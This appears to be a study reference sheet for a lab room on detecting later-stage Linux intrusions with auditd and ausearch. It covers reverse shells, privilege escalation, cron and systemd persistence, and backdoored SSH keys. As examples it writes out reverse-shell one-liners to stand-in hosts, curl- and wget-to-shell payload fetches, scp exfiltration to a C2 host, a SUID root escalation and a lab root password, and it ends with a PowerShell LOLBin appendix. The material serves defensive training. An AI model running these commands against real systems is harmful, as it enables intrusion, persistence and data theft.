# 🐧 Linux Threat Detection 3 — Reference Sheet

> **TL;DR:** This room covers the *later* stages of targeted Linux intrusions — reverse shells, privilege escalation, and persistence — and how each leaves traces in `auditd` and authentication logs. The core analyst workflow is to start from one suspicious process (e.g. `socat`), then walk **up and down the process tree** with `ausearch -i --pid` / `--ppid` to reconstruct the full attack chain, confirming privilege escalation by comparing the effective `uid` before and after an exploit.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| `127.0.0.1` is a decoy | In the TryPingMe injection, the ping target is just a disguise. The real payload is everything after `&&` (e.g. `socat TCP:attacker.thm:1337`). The question "which IP spawned a reverse shell" asks for the **attacker listener IP**, not the ping target. |
| `echo >> authorized_keys` is invisible | `echo` is a Bash **builtin**, so `echo "key" >> ~/.ssh/authorized_keys` is logged only as `proctitle=bash`, not as `echo`. Monitor the *file* with `ausearch -i -f`, not the process. |
| Don't detect priv-esc by signature | There are hundreds of SUID misconfigs and thousands of CVEs. Detect the **surrounding behavior** (discovery spike → download to /tmp → compile → exfil) instead of the exact exploit. |
| Confirm priv-esc by UID change | A successful exploit shows the child process running with a *different* (higher) `uid` than its parent. Same UID = escalation likely failed. |
| `su` ≠ `sudo` | `su root` = fully **switch** to root, needs root's password. `sudo <cmd>` = run **one** command elevated, needs *your own* password. The room's answer was `su root`. |
| EXECVE args are 0-indexed | `a0` is the command itself, `a1`, `a2`... are arguments. `argc=4 a0=grep a1=-iR a2=pass a3=.` means the full command was `grep -iR pass .` |
| `cloud-init` keys are legit | On a cloud VM, `/home/<user>/.ssh/authorized_keys` written by `proctitle=/usr/bin/python3 .../cloud-init init` is **normal** provisioning. A key added to `/root/.ssh/authorized_keys` via `proctitle=bash` (with `auid=ubuntu`, `uid=root`) is the **backdoor**. |
| App-layer persistence is invisible to auditd | A web shell (e.g. WSO) lives inside the application, so `auditd` and system logs never see it. If malware reappears after you've cleaned cron/systemd/SSH, suspect a compromised public-facing app. |
| Hidden files hide credentials | `.env` / `.env.local` files start with `.` and are missed by plain `ls`. Use `ls -a` to reveal them. The room's root password lived in `/opt/trypingme/.env.local`. |
| Linux matters even in Windows shops | A single compromised public-facing Linux box (firewall, web/mail server, hypervisor) can be the entry point into a 99%-Windows network. Linux ransomware targeting hypervisors is rising. |

## 🔁 Task 2 — Reverse Shells

**Concept:** When initial access comes via an exploit or web vuln (not SSH), the attacker often only has a limited, buggy command channel. They establish a **reverse shell** — a connection *from* the victim *to* the attacker — to get a full, convenient shell. SOC treats reverse shells as **critical** alerts: the box is already breached and a human is active.

### Common reverse shell one-liners

| Method | Command on victim | Notes |
|---|---|---|
| Bash | `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | Victim connects to `10.10.10.10:1337`, launches bash for the attacker. |
| Socat | `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Attacker listens at `10.20.20.20:2525`. Gives a fuller PTY. |
| Python | `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Attacker listens at `10.30.30.30:80`. |

### Finding the reverse shell origin (walk *up* the tree)

**Purpose:** Identify which process spawned the reverse shell — confirm it traces back to the vulnerable app.

```bash
ausearch -i -x socat
# -x = filter by executable name. Find suspicious commands like socat.
# Returns PROCTITLE (socat TCP:...:2525 EXEC:'bash') + SYSCALL with ppid=27806 pid=27808

ausearch -i --pid 27806
# Find that process's parent — building the tree upward.
# Reveals: /bin/sh -c ... && socat TCP:...  (ppid=27796 pid=27806)

ausearch -i --pid 27796
# Move up again to confirm origin.
# Reveals: /usr/bin/python3 /opt/trypingme/main.py  → the vulnerable TryPingMe app
```

### Listing reverse shell activity (walk *down* the tree)

**Purpose:** Enumerate every command the attacker ran *inside* the reverse shell.

```bash
ausearch -i -x socat
# Start from the detected reverse shell (pid=27808).

ausearch -i --ppid 27808 | grep proctitle
# --ppid lists all CHILD processes of the shell.
# Reveals discovery activity: id  /  uname -a  /  ls -la .
```

### Read an exported scenario log

```bash
ausearch -i -if /home/ubuntu/scenario/audit.log
# -if = read from a specific log FILE instead of the live system log.
# Tip: scroll to the BEGINNING of the attack and apply extra filters
# to find the original attacker listener IP.
```

## ⬆️ Task 3 — Privilege Escalation

**Concept:** Initial access often lands as a low-privilege service user (e.g. `www-data`, `svctrypingme`), sometimes confined to one folder. The attacker needs **privilege escalation** to reach root.

### Common escalation patterns (IF discovery → THEN exploit)

| Preceding discovery | Escalation taken |
|---|---|
| `uname -a` shows old, unpatched Ubuntu 16.04 | Run a kernel/local exploit, e.g. PwnKit: `wget http://bad.thm/pwnkit.sh \| bash` |
| `find /bin -perm 4000` finds an `env` binary with SUID | Abuse SUID for root: `/bin/env /bin/bash -p` |
| `ls /etc/ssh` exposes an unprotected `ssh-backup-key` | Reuse the key: `ssh root@127.0.0.1 -i ssh-backup-key` |

### Detecting escalation by surrounding behavior

Rather than fingerprint every CVE, alert on the **behavioral chain**:

| Signal | Example commands |
|---|---|
| **1. Discovery spike** | `whoami` → `id; pwd; ls -la; crontab -l` → `ps aux \| egrep "edr\|splunk\|elastic"` (security-tool discovery) → `uname -r` |
| **2. Download to temp + compile** | `wget http://c2.thm/pwnkit.c -O /tmp/pwnkit.c` → `gcc /tmp/pwnkit.c -o /tmp/pwnkit` → `chmod +x /tmp/pwnkit` → `/tmp/pwnkit` |
| **3. Data exfiltration (post-root)** | `whoami` (now root) → `tar czf dump.tar.gz /root /etc/` → `scp dump.tar.gz attacker@c2.thm:~` |

### Confirming escalation succeeded (compare UID across the tree)

**Purpose:** Prove the exploit elevated privileges — the child shell runs as a *different* user than the exploit.

```bash
ausearch -i -x pwnkit
# PwnKit launched by the service user → SYSCALL shows uid=serviceuser (pid=24304)

ausearch -i --ppid 24304
# PwnKit's child is a shell now running uid=root (pid=24310) → escalation confirmed

ausearch -i --ppid 24310
# Attacker continues as root → e.g. proctitle=whoami, uid=root
```

### Hunting specific commands in the scenario log

```bash
ausearch -i -if /home/ubuntu/scenario/audit.log | grep -i "grep"
# Finds the attacker's credential-harvesting greps.
# EXECVE: argc=4 a0=grep a1=-iR a2=pass a3=.  → command was: grep -iR pass .
# (Also seen: grep -iR key .)  — this is CREDENTIAL HARVESTING (post-exploitation).

ausearch -i -if /home/ubuntu/scenario/audit.log | grep -i "root"
# Finds the escalation: PROCTITLE=su root, EXECVE argc=2 a0=su a1=root
# USER_AUTH line with res=success confirms the switch worked.
```

### Reading the harvested `.env` file

```bash
cd /opt/trypingme
ls -a            # -a reveals hidden dotfiles → .env.local appears
cat .env.local   # contains: # USER=root  # PASSWORD=nGql1pQkGa
```

## 🚀 Task 4 — Startup Persistence

**Concept:** Standalone Linux servers can run for years without reboot, so some actors don't bother with persistence. Targeted actors do — the two most common reboot-survival methods are **cron jobs** and **systemd services**.

### Cron persistence

| Example | What it does |
|---|---|
| `@reboot nohup /home/<user>/.<hidden-dir>/<malware> > /dev/null 2>&1 &` | APT29 **GoldMax** — runs malware on every boot via `/var/spool/cron/<user>`. |
| `echo "*/10 * * * root (curl https://pastebin.com/raw/...) \| sh" > /etc/cron.d/root` | **Rocke** cryptominer — re-downloads payload every 10 min to self-heal if IT deletes files. |

### Systemd persistence

```ini
# /lib/systemd/system/cloud-online.service  (Sandworm GOGETTER example)
[Unit]
Description=Initial cloud-online job      # fake description mimics a trusted service
[Service]
ExecStart=/usr/bin/cloud-online           # malware disguised as a trusted binary
```
The **`ExecStart=`** line points to the malware path — always read it.

### What to monitor with auditd

| Watch for changes in | Paths |
|---|---|
| Cron files | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |
| Systemd folders | `/lib/systemd/system/*`, `/etc/systemd/system/*` (and less-common locations) |
| Related processes | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>` |

### Detection commands

```bash
ausearch -i -f /etc/systemd
# File changes in /etc/systemd. PROCTITLE=vi /etc/systemd/system/malicious.service
# SYSCALL shows openat ... O_WRONLY|O_CREAT|O_EXCL, uid=root → a new service was written.

ausearch -i -x crontab
# Execution of crontab. PROCTITLE=crontab -e → someone edited a cron job.
```

### Walkthrough used in the room

```bash
sudo su
ls -la /etc/systemd/system                  # spot odd services: tux.service, badr.service
cat /etc/systemd/system/tux.service         # ExecStart=/var/lib/misc/tux
cat /etc/systemd/system/badr.service        # ExecStart=/etc/badr/badr --config ...
ausearch -i -f /etc/systemd/ | grep proctitle
chmod +x /var/lib/misc/tux && /var/lib/misc/tux   # run service malware → flag

ausearch -i -f /var/spool/cron | grep proctitle   # proctitle=crontab -e
cat /var/spool/cron/crontabs/root                 # @reboot /usr/sbin/phoenix
/usr/sbin/phoenix                                 # run cron malware → flag
```

## 👤 Task 5 — Account Persistence

**Concept:** Reboot-survival keeps malware alive; **account persistence** keeps *access* alive (return in a month, no malware left behind). Method depends on how the attacker got in.

### New user account

If SSH is exposed, create a user, add it to a privileged group, then log in via SSH. Detect through **auth.log**, then rebuild the tree with auditd.

```bash
cat /var/log/auth.log | grep -E 'useradd|usermod'
# useradd[...]: new group: name=support, GID=1001
# useradd[...]: new user: name=support, ... shell=/bin/bash
# usermod[...]: add 'support' to group 'sudo'        ← privileged group = red flag
# usermod[...]: add 'support' to shadow group 'sudo'

ausearch -i --ppid 27254      # reconstruct what the creation process did
```

### Backdoored SSH keys

Append the attacker's public key to `~/.ssh/authorized_keys` — blends in with legitimate keys.

```bash
ausearch -i -f /.ssh/authorized_keys
# echo "key" >> authorized_keys is a SHELL BUILTIN, so it logs as proctitle=bash (NOT echo).
# Monitor the FILE, not the process.
```

**Distinguishing legit vs malicious key changes (the room's key lesson):**

| File | proctitle | auid / uid | Verdict |
|---|---|---|---|
| `/home/ubuntu/.ssh/authorized_keys` | `/usr/bin/python3 .../cloud-init init` | normal | **Legit** — cloud-init provisioning |
| `/root/.ssh/authorized_keys` | `bash` | `auid=ubuntu`, `uid=root` | **Backdoor** — ubuntu user wrote root's key file as root |

### Application persistence (awareness only)

A web shell (e.g. WSO) on a breached WordPress admin lets the attacker run commands through the app — no cron or SSH needed. It lives in the **application layer**, so `auditd`/system logs never see it. If malware keeps reappearing after cleaning everything, suspect a compromised public-facing app.

## 🌍 Task 6 — Targeted Attacks and Recap

| Theme | Takeaway |
|---|---|
| Linux as entry point | A single compromised public-facing Linux box (firewall/web/mail server) can open the door to a corporate network, even in 99%-Windows orgs. |
| Linux in espionage | State-sponsored groups (e.g. Kimsuky) target sensitive/mission-critical Linux hosts, often using **systemd service** persistence. |
| Linux in ransomware | Rising fast — **hypervisors** are prime targets. Compromise three Linux hypervisors and hundreds of hosted Windows VMs are at risk. |
| Why monitor Linux | Linux is critical infrastructure and a common target for both commodity and targeted threats — a dangerous blind spot if skipped. |

## 🧰 ausearch Quick Reference

| Flag | Meaning | Example |
|---|---|---|
| `-i` | Interpret raw values into human-readable form | `ausearch -i -x socat` |
| `-x <exe>` | Filter by executable name | `ausearch -i -x crontab` |
| `-f <path>` | Filter by file path touched | `ausearch -i -f /.ssh/authorized_keys` |
| `-if <file>` | Read from a specific log file | `ausearch -i -if /home/ubuntu/scenario/audit.log` |
| `--pid <n>` | Filter to a specific PID (walk **up** the tree) | `ausearch -i --pid 27796` |
| `--ppid <n>` | Filter to children of a PID (walk **down** the tree) | `ausearch -i --ppid 27808` |
| `\| grep proctitle` | Show only the executed command lines | `ausearch -i -f /etc/systemd \| grep proctitle` |

**Reading EXECVE:** `argc` = total argument count (0-indexed); `a0` = the command, `a1..aN` = arguments.
Example: `argc=4 a0=grep a1=-iR a2=pass a3=.` → `grep -iR pass .`

## 🪟 Appendix — Windows/PowerShell LOLBin Cheat (supplementary notes in source)

> Cross-topic notes included at the end of the source PDF. Single flags are often **grey**; **combinations** push strongly toward malicious.

| Item | Legitimate use | Malicious use |
|---|---|---|
| `IEX` (Invoke-Expression) | Run a string as a PowerShell command | Execute a remote script fetched via `DownloadString` |
| `DownloadString` | Fetch web config/script content | Run a remote script in memory without dropping a file |
| `EncodedCommand` | Safely pass a long command | Hide command content to evade analysis/detection |
| `mshta` | Run `.hta` apps/scripts | Launch PowerShell from inline JavaScript |
| `rundll32` | Call a legit function inside a DLL | Run a suspicious DLL from `Temp` to load a payload |
| `certutil` | Cert management, encode/decode | `-urlcache -split -f` to download an EXE/script |
| `wmic process call create` | Start a process locally/remotely | Lateral movement — launch remote PowerShell payload |
| `-NoP` (NoProfile) | Start PowerShell without profile (lightweight) | Minimize environment to avoid monitoring |
| `-NonI` (NonInteractive) | Non-interactive automation | Automated malicious script execution |
| `-W Hidden` | Hide the PowerShell window | Run hidden from the user |
| `-Exec Bypass` | Bypass execution policy for admin scripts | Bypass restrictions to run malicious scripts |

**High-danger combinations:** `IEX + DownloadString` · `EncodedCommand + NoP + NonI` · `mshta + javascript + PowerShell` · `certutil + download + Public/Temp` · `rundll32 + Temp DLL` · `wmic remote create + PowerShell`.
Memory aid: **hide + fetch externally + run inline + run remotely + run from Temp/Public** — the more of these together, the more malicious.
